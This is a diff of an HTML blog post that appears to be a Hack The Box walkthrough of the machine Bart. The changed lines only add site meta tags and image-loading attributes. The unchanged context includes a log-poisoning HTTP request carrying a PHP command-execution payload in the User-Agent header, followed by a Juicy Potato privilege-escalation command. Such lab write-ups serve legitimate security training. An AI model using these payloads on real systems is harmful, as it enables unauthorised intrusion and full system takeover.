@@ -3,6 +3,18 @@
 <head>
     <meta charset="utf-8">
     <title>HTB: Bart | HackWithJordan</title>
+    <!-- site-meta -->
+    <meta name="description" content="Walkthrough of the Hack The Box machine Bart, from first foothold to full compromise.">
+    <link rel="canonical" href="https://hackwithjordan.com/posts/2024-09-25-Bart(HTB).html">
+    <meta property="og:type" content="article">
+    <meta property="og:site_name" content="HackWithJordan">
+    <meta property="og:title" content="HTB: Bart">
+    <meta property="og:description" content="Walkthrough of the Hack The Box machine Bart, from first foothold to full compromise.">
+    <meta property="og:url" content="https://hackwithjordan.com/posts/2024-09-25-Bart(HTB).html">
+    <meta property="og:image" content="https://hackwithjordan.com/assets/room/poster.jpg">
+    <meta name="twitter:card" content="summary_large_image">
+    <meta property="article:published_time" content="2024-09-25">
+    <!-- /site-meta -->
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <link rel="stylesheet" href="../assets/css/syntax.css">
     <style>
@@ -302,7 +314,7 @@
 
         <p>Possible users found</p>
 
-        <img alt="Screenshot 2" height="451" src="../img/posts/2024-09-25-Bart(HTB)/02-d97803ff41.png" style="aspect-ratio:1159/451;" width="1159"/>
+        <img loading="lazy" decoding="async" alt="Screenshot 2" height="451" src="../img/posts/2024-09-25-Bart(HTB)/02-d97803ff41.png" style="aspect-ratio:1159/451;" width="1159"/>
 
         <p>Found another user in html code</p>
 
@@ -314,13 +326,13 @@
 
         <p>Monitoring site running php monitor v3.2.1</p>
 
-        <img alt="Screenshot 3" height="502" src="../img/posts/2024-09-25-Bart(HTB)/03-ed72a2ef5d.png" style="aspect-ratio:1481/502;" width="1481"/>
+        <img loading="lazy" decoding="async" alt="Screenshot 3" height="502" src="../img/posts/2024-09-25-Bart(HTB)/03-ed72a2ef5d.png" style="aspect-ratio:1481/502;" width="1481"/>
 
         <p>Using all the names found above I generated possible usernames with username anarchy and we found a valid one. </p>
 
         <p>http://monitor.bart.htb/index.php?action=forgot</p>
 
-        <img alt="Screenshot 4" height="381" src="../img/posts/2024-09-25-Bart(HTB)/04-f9c0faef29.png" style="aspect-ratio:479/381;" width="479"/>
+        <img loading="lazy" decoding="async" alt="Screenshot 4" height="381" src="../img/posts/2024-09-25-Bart(HTB)/04-f9c0faef29.png" style="aspect-ratio:479/381;" width="479"/>
 
         <p>daniel and harvey are valid users</p>
 
@@ -330,15 +342,15 @@
 
         <p>Once signed in we can see another sub domain</p>
 
-        <img alt="Screenshot 5" height="658" src="../img/posts/2024-09-25-Bart(HTB)/05-8877936a39.png" style="aspect-ratio:1557/658;" width="1557"/>
+        <img loading="lazy" decoding="async" alt="Screenshot 5" height="658" src="../img/posts/2024-09-25-Bart(HTB)/05-8877936a39.png" style="aspect-ratio:1557/658;" width="1557"/>
 
         <p>With another login page</p>
 
-        <img alt="Screenshot 6" height="345" src="../img/posts/2024-09-25-Bart(HTB)/06-c6a2002e80.png" style="aspect-ratio:413/345;" width="413"/>
+        <img loading="lazy" decoding="async" alt="Screenshot 6" height="345" src="../img/posts/2024-09-25-Bart(HTB)/06-c6a2002e80.png" style="aspect-ratio:413/345;" width="413"/>
 
         <p>Tried brute forcing with no luck found some directories. Register.php is super interesting.</p>
 
-        <img alt="Screenshot 7" height="171" src="../img/posts/2024-09-25-Bart(HTB)/07-2f173f9ec0.png" style="aspect-ratio:750/171;" width="750"/>
+        <img loading="lazy" decoding="async" alt="Screenshot 7" height="171" src="../img/posts/2024-09-25-Bart(HTB)/07-2f173f9ec0.png" style="aspect-ratio:750/171;" width="750"/>
 
         <p>I tried creating a user and had done it at the wrong link. I did it at register_form.php as i found from the source code but I should have done it with register.php. Simple mistake.</p>
 
@@ -346,7 +358,7 @@
 
         <p>uname=testuser&amp;passwd=testpassword</p>
 
-        <img alt="Screenshot 8" height="695" src="../img/posts/2024-09-25-Bart(HTB)/08-508a258069.png" style="aspect-ratio:1548/695;" width="1548"/>
+        <img loading="lazy" decoding="async" alt="Screenshot 8" height="695" src="../img/posts/2024-09-25-Bart(HTB)/08-508a258069.png" style="aspect-ratio:1548/695;" width="1548"/>
 
         <p>Interesting code in the html</p>
 
@@ -354,7 +366,7 @@
 
         <p>Looking at this code I instantly thought of log poisoning and that's exactly what we have here.<br/><br/> </p>
 
-        <img alt="Screenshot 9" height="607" src="../img/posts/2024-09-25-Bart(HTB)/09-32ccf2203f.png" style="aspect-ratio:1849/607;" width="1849"/>
+        <img loading="lazy" decoding="async" alt="Screenshot 9" height="607" src="../img/posts/2024-09-25-Bart(HTB)/09-32ccf2203f.png" style="aspect-ratio:1849/607;" width="1849"/>
 
         <p><br/>GET /log/log.php?cmd=dir&amp;filename=log.php&amp;username=harvey HTTP/1.1<br/>Host: internal-01.bart.htb<br/>User-Agent: &lt;?php system($_GET['cmd']); ?&gt;<br/>Accept: */*<br/>Accept-Language: en-US,en;q=0.5<br/>Accept-Encoding: gzip, deflate, br<br/>Connection: keep-alive<br/>Referer: http://internal-01.bart.htb/<br/>Cookie: PHPSESSID=1bpn3ts6gtr300uvqbdv3fnjug</p>
 
@@ -370,21 +382,21 @@
 
         <p><br/> We get a callback</p>
 
-        <img alt="Screenshot 10" height="236" src="../img/posts/2024-09-25-Bart(HTB)/10-e9f9135406.png" style="aspect-ratio:483/236;" width="483"/>
+        <img loading="lazy" decoding="async" alt="Screenshot 10" height="236" src="../img/posts/2024-09-25-Bart(HTB)/10-e9f9135406.png" style="aspect-ratio:483/236;" width="483"/>
 
         <h1 style="color:#5eead4;">Shell as system</h1>
 
         <p>We cannot get the user flag yet but we do have impersonate privilege enabled so we should be able to exploit this.</p>
 
-        <img alt="Screenshot 11" height="224" src="../img/posts/2024-09-25-Bart(HTB)/11-544e238059.png" style="aspect-ratio:630/224;" width="630"/>
+        <img loading="lazy" decoding="async" alt="Screenshot 11" height="224" src="../img/posts/2024-09-25-Bart(HTB)/11-544e238059.png" style="aspect-ratio:630/224;" width="630"/>
 
         <p>Using Juciy Potato</p>
 
         <p>jp.exe -t * -p shell.bat -c {e60687f7-01a1-40aa-86ac-db1cbf673334} -l 8080</p>
 
-        <img alt="Screenshot 12" height="128" src="../img/posts/2024-09-25-Bart(HTB)/12-7093e3ed78.png" style="aspect-ratio:759/128;" width="759"/>
+        <img loading="lazy" decoding="async" alt="Screenshot 12" height="128" src="../img/posts/2024-09-25-Bart(HTB)/12-7093e3ed78.png" style="aspect-ratio:759/128;" width="759"/>
 
-        <img alt="Screenshot 13" height="182" src="../img/posts/2024-09-25-Bart(HTB)/13-5e3c834092.png" style="aspect-ratio:550/182;" width="550"/>
+        <img loading="lazy" decoding="async" alt="Screenshot 13" height="182" src="../img/posts/2024-09-25-Bart(HTB)/13-5e3c834092.png" style="aspect-ratio:550/182;" width="550"/>
     </article>
 
 <script>
